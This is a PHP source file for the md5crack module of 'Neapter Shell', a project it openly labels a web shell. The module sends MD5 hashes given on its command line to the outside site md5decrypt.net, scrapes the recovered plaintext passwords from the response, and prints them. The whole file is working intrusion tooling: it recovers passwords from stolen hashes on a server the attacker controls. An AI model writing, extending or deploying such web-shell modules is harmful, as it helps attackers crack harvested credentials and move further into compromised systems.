<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Crack md5 hashes
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleMd5Crack extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array('md5crack');
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.3 2016-06-17 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Łamanie haszy md5

	Użycie:
		md5crack hashmd5 [hashmd5] [hashmd5]

	Przykład:
		md5crack 098f6bcd4621d373cade4e832627b4f6 b36d331451a61eb2d76860e00c347396
DATA;
    }

    /**
     * Try to crack md5 hash
     *
     * @return string
     */
    protected function crackMd5($sHash)
    {
        $sHash = strtolower($sHash);

        $aHeaders = array(
            'http' => array(
                'method' => 'POST',
                'content' => sprintf("hash=%s&decrypt=Decrypt", $sHash)
            )
        );

        $sData = @file_get_contents(
            'http://md5decrypt.net/en/',
            false,
            stream_context_create($aHeaders)
        );

        preg_match(
            '~</script></div><br/>([A-Fa-f0-9]{32}) : <b>(.+?)</b><br/><br/>Found~',
            $sData,
            $aMatch
        );

        if (!$aMatch) {
            return sprintf("%s:password-not-found", $sHash);
        }

        return sprintf("%s:%s", $aMatch[1], $aMatch[2]);
    }

    /**
     * Execute module
     *
     * @return string
     */
    public function get()
    {
        if (($iParams = $this->oArgs->getNumberOfParams()) === 0) {
            return self::getHelp();
        }

        $sOutput = '';
        for ($i = 0; $i < $iParams; ++$i) {
            $sHash = $this->oArgs->getParam($i);

            if (!preg_match('~^[a-zA-Z0-9]{32}\z~', $sHash)) {
                continue;
            }

            if ($sCracked = $this->crackMd5($sHash)) {
                $sOutput .= $sCracked . "\r\n";
            }
        }

        return htmlspecialchars($sOutput);
    }

}
